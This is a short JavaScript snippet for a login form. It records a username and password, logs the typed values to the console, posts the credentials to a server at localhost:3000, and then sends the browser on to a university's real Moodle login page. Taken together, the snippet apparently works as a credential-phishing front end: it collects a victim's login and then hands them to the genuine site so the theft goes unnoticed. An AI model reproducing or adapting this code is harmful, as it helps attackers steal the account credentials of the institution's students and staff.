let username;
let password;

const handlechangeusername = (e) => {
  username = e.value;

  console.log("e:", e.value);
};
const handlechangepassword = (e) => {
  password = e.value;
  console.log("e:", e.value);
};

const handleSubmit = async () => {
  fetch("http://localhost:3000/login", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ username, password }),
  });
  window.location.href =
    "https://online-learning.gidatarim.edu.tr/login/index.php";
};
